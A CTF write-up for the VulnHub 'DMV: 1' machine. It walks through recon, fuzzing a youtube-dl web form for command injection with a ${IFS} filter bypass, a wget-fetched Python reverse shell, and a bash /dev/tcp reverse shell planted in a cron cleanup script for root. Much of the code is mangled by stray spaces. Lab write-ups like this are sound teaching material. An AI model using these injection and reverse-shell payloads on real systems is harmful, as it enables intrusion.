---
title: DMV:1 - WRITE-UP
date: 2020-06-03 06:46:00 +0100
categories: [VulnHub, DMV]
tags: [python-requests, reverse-shell, waf-bypassing, crontabs]
lang: en
---
## MAIN INFORMATION ABOUT THE BOX
### BOX NAME: DMV: 1
### Description:
```
It is a simple machine that replicates a real scenario that I found.

The goal is to get two flags, one that is in the secret folder and the other that can only be read by the root user


This works better with VirtualBox rather than VMware.
```
## RECON

### NMAP

Let's start by running Nmap on the Box:

``` bash
$ nmap -T4 -p- -A 192.168.56.111
```
```
Starting Nmap 7.80 (https://nmap.org) at 2020-06-02 13:19 EDT
Nmap scan report for 192.168.56.111
Host is up (0.00021s latency).
Not shown: 65533 closed ports
PORT STATE SERVICE VERSION
22 / tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 65: 1b: fc: 74: 10: 39: df: dd: d0: 2d: f0: 53: 1c: eb: 6d: ec (RSA)
| 256 c4: 28: 04: a5: c3: b9: 6a: 95: 5a: 4d: 7a: 6e: 46: e2: 14: db (ECDSA)
| _ 256 ba: 07: bb: cd: 42: 4a: f2: 93: d1: 05: d0: b3: 4c: b1: d9: b1 (ED25519)
80 / tcp open http Apache httpd 2.4.29 ((Ubuntu))
| _http-server-header: Apache / 2.4.29 (Ubuntu)
| _http-title: Site doesn't have a title (text / html; charset = UTF-8).
Service Info: OS: Linux; CPE: cpe: / o: linux: linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 9.18 seconds
```
We can see that the Box has an open HTTP port when entering the website, we see the Youtube logo with a simple Input.


### GOBUSTER
I run the gobuster tool to brute-force page directories.

``` bash
$ gobuster dir --url http://192.168.56.111 --wordlist /usr/share/wordlists/dirb/common.txt
================================================== =============
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
================================================== =============
[+] Url: http://192.168.56.111
[+] Threads: 10
[+] Wordlist: /usr/share/wordlists/dirb/common.txt
[+] Status codes: 200,204,301,302,307,401,403
[+] User Agent: gobuster / 3.0.1
[+] Timeout: 10s
================================================== =============
2020/06/02 13:21:52 Starting gobuster
================================================== =============
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/ admin (Status: 401)
/ images (Status: 301)
/index.php (Status: 200)
/ js (Status: 301)
/ server-status (Status: 403)
/ tmp (Status: 301)
================================================== =============
2020/06/02 13:21:52 Finished
================================================== =============
```
From the above, I can see that only the home page is reachable by the client. We have nothing left but to play with this Input !.
### DISCOVERING APPLICATION BEHAVIOR
We will use the "requests" python module for this. Why, because using Python for this purpose gives you much more freedom than the Community Burp Suite version. Also because just scripting such things is always a good lesson: P

So I created a simple script that will allow us to play with input

``` python
#! / usr / bin / python

import requests
import d

url = 'http://192.168.56.111'



r = requests.post (
url,
data = {"yt_url": '>'},
headers = {
'Host': '192.168.56.111',
'User-Agent': 'Mozilla / 5.0 (X11; Linux x86_64; rv: 76.0) Gecko / 20100101 Firefox / 76.0',
'Accept': '* / *',
'Accept-Language': 'en-US, en; q = 0.5',
'Accept-Encoding': 'gzip, deflate',
'Content-Type': 'application / x-www-form-urlencoded; charset = UTF-8 ',
'X-Requested-With': 'XMLHttpRequest',
'Content-Length': '66',
'Origin': 'http://192.168.56.111',
'Connection': 'close',
'Referer': 'http://192.168.56.111/index.php',
}


)

print (r.cookies)
print ("===========")
print (r.text)
print ("===========")
print (r.headers)
```
Our string is present in the "data" variable.
By doing it, we will get:

```bash
$ python DMV: 1_script.py
<RequestsCookieJar []>
===========
{"status": 1, "errors": "WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this. \ nERROR: u'testtestestest 'is not a valid URL . Set --default-search \ "ytsearch \" (or run youtube-dl \ "ytsearch: testtestestest \") to search YouTube \ n "," url_orginal ":" testtestestest "," output ":" "," result_url ":" \ / tmp \ / downloads \ /5ed68be90d2e9.mp3 "}
===========
{'Content-Length': '297', 'Content-Encoding': 'gzip', 'Vary': 'Accept-Encoding', 'Server': 'Apache / 2.4.29 (Ubuntu)', 'Connection': 'close', 'Date': 'Tue, 02 Jun 2020 17:27:05 GMT', 'Content-Type': 'text / html; charset = UTF-8 '}
```

We get an error. Mhmm, interesting. Maybe this error is specifically related to some software the server uses?
By typing in Google, we get ...

Lots of issues from Github :P. The first is about youtube-dl. When you see the README of the repository, you may notice a very dangerous software flag.

```
--exec CMD Execute a command on the file after
                                 downloading and post-processing, similar to
                                 find's -exec syntax. Example: --exec 'adb
                                 push {} / sdcard / Music / && rm {} '
```

I enter the command with this flag in the "date" field.

```
'yt_url': '- exec whoami'
```

The error, however, still exists the same.
Maybe the problem is caused by strange command parsing? I deleted the spaces.

``` '--execwhoami' ```

Output surprises. For we see:
```

{"status": 2, "errors": "Usage: youtube-dl [OPTIONS] URL [URL ...] \ n \ nyoutube-dl: error: no such option: --execwhoami \ n", "url_orginal" : "- execwhoami", "output": "", "result_url": "\ / tmp \ / downloads \ /5ed69849b1a6d.mp3"}


```
Now at least we know it's about spaces. Now the question is how to put it in UTF-8 format?
The space value in UTF-8 is either "+" or "% 20". There is even a special bash variable $ {IFS} that replaces spaces. Unfortunately, neither of these options works. Or am I wrong?
Maybe it works, **except that something else is stopping the command from executing?** Often WAFs filter out special characters. Let's see if it's not about signs.

## Fuzzing / WAF BYPASS
We will edit the script to sequentially brute-force the special characters.

``` python

#! / usr / bin / python

import requests
import d
import string


url = 'http://192.168.56.111'
special_chars = string.punctuation
print (special_chars)
filtered_chars = []

for ch in special_chars:
print ('TRYING:' + ch + '===================================== \ n' )
r = requests.post (
url,
data = {'yt_url': ''. join (ch)},
headers = {
headers
}
)
if r:
filtered_chars.append (ch)
print (r.text)
else:
break

print (filtered_chars)
```
The script checks each character in turn. Characters that after sending gave the HTTP status positive are added to the list (These are all special characters) Now, then, it's time to analyze the server's response



``` python
$ python3 DMV: 1_script.py
! "# $% & '() * +, -. / :; <=>? @ [\] ^ _` {|} ~
TRYING:! =====================================

{"status": 1, "errors": "WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this. \ nERROR: u '!' is not a valid URL. Set --default-search \ "ytsearch \" (or run youtube-dl \ "ytsearch:! \") to search YouTube \ n "," url_orginal ":"! "," output ": "", "result_url": "\ / tmp \ / downloads \ /5ed76bb2584f1.mp3"}
TRYING: "=====================================

{"status": 2, "errors": "sh: 1: Syntax error: Unterminated quoted string \ n", "url_orginal": "\" "," output ":" "," result_url ":" \ / tmp \ / downloads \ /5ed76bb388791.mp3 "}
TRYING: # =====================================

{"status": 2, "errors": "WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this. \ nUsage: youtube-dl [OPTIONS] URL [URL ...] \ n \ nyoutube-dl: error: You must provide at least one URL. \ nType youtube-dl --help to see a list of all options. \ n "," url_orginal ":" # "," output ":" "," result_url ":" \ / tmp \ / downloads \ /5ed76bb3898a2.mp3 "}
TRYING: $ =====================================

{"status": 1, "errors": "WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this. \ nERROR: u '$' is not a valid URL Set --default-search \ "ytsearch \" (or run youtube-dl \ "ytsearch: $ \") to search YouTube \ n "," url_orginal ":" $ "," output ":" "," result_url ":" \ / tmp \ / downloads \ /5ed76bb44a615.mp3 "}
TRYING:% =====================================

{"status": 1, "errors": "WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this. \ nERROR: u '%' is not a valid URL Set --default-search \ "ytsearch \" (or run youtube-dl \ "ytsearch:% \") to search YouTube \ n "," url_orginal ":"% "," output ":" "," result_url ":" \ / tmp \ / downloads \ /5ed76bb586577.mp3 "}

['!', '"', '#', '$', '%', '&'," '",' (',') ',' * ',' + ',', ',' - ','. ',' / ',': ','; ',' <',' = ','> ','? ',' @ ',' [',' \\ ','] ',' ^ ',' _ ',' `',' {',' | ','} ',' ~ ']
```
I allowed myself to shorten the output. We see an amazing thing. With many characters, the server response evaluates to bash ``` "errors": sh: 1```.
Let's change the condition so that it also takes into account the response content from the server ``` if "sh: 1" in r.text: ```

``` python
python3 DMV: 1_script.py
! "# $% & '() * +, -. / :; <=>? @ [\] ^ _` {|} ~


TRYING: "=====================================

{"status": 2, "errors": "sh: 1: Syntax error: Unterminated quoted string \ n", "url_orginal": "\" "," output ":" "," result_url ":" \ / tmp \ / downloads \ /5ed76e43df7cc.mp3 "}


TRYING: & =====================================

{"status": 127, "errors": "sh: 1: -f: not found \ nWARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this. \ nUsage : youtube-dl [OPTIONS] URL [URL ...] \ n \ nyoutube-dl: error: You must provide at least one URL. \ nType youtube-dl --help to see a list of all options. \ n " , "url_orginal": "&", "output ":" "," result_url ":" \ / tmp \ / downloads \ /5ed76e4733f9e.mp3 "}
TRYING: '=====================================

{"status": 2, "errors": "sh: 1: Syntax error: \" (\ "unexpected \ n", "url_orginal": "'", "output": "", "result_url": "\ /tmp\/downloads\/5ed76e47e8c4e.mp3 "}
TRYING: (=====================================

{"status": 2, "errors": "sh: 1: Syntax error: \" (\ "unexpected \ n", "url_orginal": "(", "output": "", "result_url": "\ /tmp\/downloads\/5ed76e47ea248.mp3 "}
TRYING :) =====================================

{"status": 2, "errors": "sh: 1: Syntax error: \") \ "unexpected \ n", "url_orginal": ")", "output": "", "result_url": "\ /tmp\/downloads\/5ed76e47eb86b.mp3 "}


TRYING:; =====================================

{"status": 127, "errors": "WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this. \ nUsage: youtube-dl [OPTIONS] URL [URL ...] \ n \ nyoutube-dl: error: You must provide at least one URL. \ nType youtube-dl --help to see a list of all options. \ nsh: 1: -f: not found \ n " , "url_orginal": ";", "output": "", "result_url": "\ / tmp \ / downloads \ /5ed76e5027755.mp3"}

{"status": 2, "errors": "sh: 1: Syntax error: EOF in backquote substitution \ n", "url_orginal": "" "," output ":" "," result_url ":" \ / tmp \ / downloads \ /5ed76e5d991f2.mp3 "}

TRYING: | =====================================

{"status": 127, "errors": "sh: 1: -f: not found \ nWARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this. \ nUsage : youtube-dl [OPTIONS] URL [URL ...] \ n \ nyoutube-dl: error: You must provide at least one URL. \ nType youtube-dl --help to see a list of all options. \ n " , "url_orginal": "|", "output": "", "result_url": "\ / tmp \ / downloads \ /5ed76e5ecc62e.mp3"}

['"', '&'," '",' (',') ','; ','` ',' | ']

```
## EXPLOITATION
So we have filtered characters that will evaluate to bash
One of the signs that were positively checked was "` ". It's called "backquote". This cookie is one of the ways of executing a command in another command. When this nested command is executed, its result will go to the "before" command. In our case, this original command with the result of a nested command will almost always return an error. The whole thing is that the server processes errors incorrectly, displaying them to us in communication
Let's change the variable "date" to

```python
{'yt_url': ''. join (ch) + '`pwd`'}
```

After executing the script, many of the characters gave a value

``` bash
sh: 1: \ / var \ / www \ / html: Permission denied
```
So it's time to filter the characters further. We change the condition to

``` python
if "sh: 1:" in r.text and "\ / var \ / www \ / html" in r.text:
```
``` python
$ python3 DMV: 1_script.py
! "# $% & '() * +, -. / :; <=>? @ [\] ^ _` {|} ~


TRYING: & =====================================

{"status": 126, "errors": "sh: 1: \ / var \ / www \ / html: Permission denied \ nWARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this. \ nUsage: youtube-dl [OPTIONS] URL [URL ...] \ n \ nyoutube-dl: error: You must provide at least one URL. \ nType youtube-dl --help to see a list of all options. \ n "," url_orginal ":" & `pwd`", "output": "", "result_url": "\ / tmp \ / downloads \ /5ed7740393c9d.mp3"}


TRYING:; =====================================

{"status": 126, "errors": "WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this. \ nUsage: youtube-dl [OPTIONS] URL [URL ...] \ n \ nyoutube-dl: error: You must provide at least one URL. \ nType youtube-dl --help to see a list of all options. \ nsh: 1: \ / var \ / www \ / html: Permission denied \ n "," url_orginal ":"; `pwd`", "output": "", "result_url": "\ / tmp \ / downloads \ /5ed7740c6b034.mp3"}

TRYING:> =====================================

{"status": 2, "errors": "sh: 1: cannot create \ / var \ / www \ / html: Is a directory \ n", "url_orginal": ">` pwd` "," output ": "", "result_url": "\ / tmp \ / downloads \ /5ed7740e7c7a1.mp3"}


TRYING: | =====================================

{"status": 126, "errors": "sh: 1: \ / var \ / www \ / html: Permission denied \ nWARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this. \ nUsage: youtube-dl [OPTIONS] URL [URL ...] \ n \ nyoutube-dl: error: You must provide at least one URL. \ nType youtube-dl --help to see a list of all options. \ n "," url_orginal ":" | `pwd`", "output": "", "result_url": "\ / tmp \ / downloads \ /5ed7741744d6e.mp3"}
TRYING:} =====================================

['&', ';', '>', '|']
```
Many of these characters are just special characters in bash. The ">" sign, however, gives us extraordinary results. It does not return an authorization error.
But how to replace spaces so that we do not cut off the rest of the command? There is a bash environment variable named '' $ {IFS} '' 'Internal Field Separator'.
Let's check another command. This time ls. Our payload looks like this:

```python
'yt_url': ''
```

Here are the results:
```python
! "# $% & '() * +, -. / :; <=>? @ [\] ^ _` {|} ~
{"status": 2, "errors": "sh: 1: cannot create \ t \ n \ t \ n - exec + whoami \ n - exec + whoami \ n - exec + whoami \ nf \ nadmin \ nimages \ nindex.php \ njs \ nstyle.css \ ntmp \ nf \ nadmin \ nimages \ nindex.php \ njs \ nstyle.css \ ntmp \ n - exec + whoami \ nf \ nadmin \ nimages \ nindex.php \ njs \ nstyle.css \ ntmp \ nf \ nadmin \ nimages \ nindex.php \ njs \ nstyle.css \ ntmp \ n - exec + whoami \ n - exec + whoami \ n - exec + whoami \ nf \ nadmin \ nimages \ nindex.php \ njs \ nstyle.css \ ntmp \ nf \ nadmin \ nimages \ nindex.php \ njs \ nstyle.css \ ntmp \ n - exec + whoami \ nf \ nadmin \ nimages \ nindex.php \ njs \ nstyle.css \ ntmp \ nf \ nadmin \ nimages \ nindex.php \ njs \ nstyle.css \ ntmp: File name too long \ n "," url_orginal ":"> $ {IFS} `ls`", "output ":" "," result_url ":" \ / tmp \ / downloads \ /5ed7775d89d70.mp3 "}
```

## ENUMERATION
Apparently we have RCE;). We can start creating a reverse shell. It will be a simple payload taken from pentestmonkey.net. We will also create a separate folder for this file. Payload looks like this:
``` python
import socket, subprocess, os; s = socket.socket (socket.AF_INET, socket.SOCK_STREAM); s.connect (("192.168.56.xxx", 1234)); os.dup2 (s.fileno (), 0 ); os.dup2 (s.fileno (), 1); os.dup2 (s.fileno (), 2); p = subprocess.call (["/ bin / sh", "- i"]); ```
We create a file called rev.py and put payload there
```
It would be a cool thing to send this payload with ``` wget ```. For this, we need to create a page from which the server will download the payload. We do it with the help of the brilliant "SimpleHTTPServer" library in python.

``` bash
python -m SimpleHTTTPServer 8080
```
Also, let's listen on port 1234 with netcat.

```
 nc -lvp 1234
```

Let's make a request to the server. The variable "data" will be ``` {'yt_url': '\ x3e`cd $ {IFS} / var / www / html / images /; wget $ {IFS} http://192.168.56.103:8080/rev. py; python $ {IFS} rev.py` '} ```.

I can't show it to you now, but we have a shell :)



in the folder / var / www / html / admin there is a flag with the value ``` flag {0d8486a0c0c42503bb60ac77f4046ed7} ```

***USER FLAG EARNED***
Now it remains to get the root flag. We have rights to directories only in / tmp and in the aforementioned / var / www / html / images. In the tmp directory, however, we see a clean.sh script

```
$ cat clean.sh
rm -rf downloads
```
This script only does what it does is delete the downloads folder. But we see after executing ``` ls -la``` that we got write access to it. This is an example of a script that seems to be scheduled now and then.
Let's edit it to have a reverse shell as well, this time we'll create it in bash.
We will take the script from pentestmonkey.com again.
We add to the script
```
bash -i> & /dev/tcp/10.0.0.1/8080 0> & 1
```
After listening to the port again, we manage to get to the shell with root privileges.
In the / root directory there is a root.txt file with the flag ``` flag {d9b368018e912b541a4eb68399c5e94a} ```

***ROOT FLAG CAPTURED***
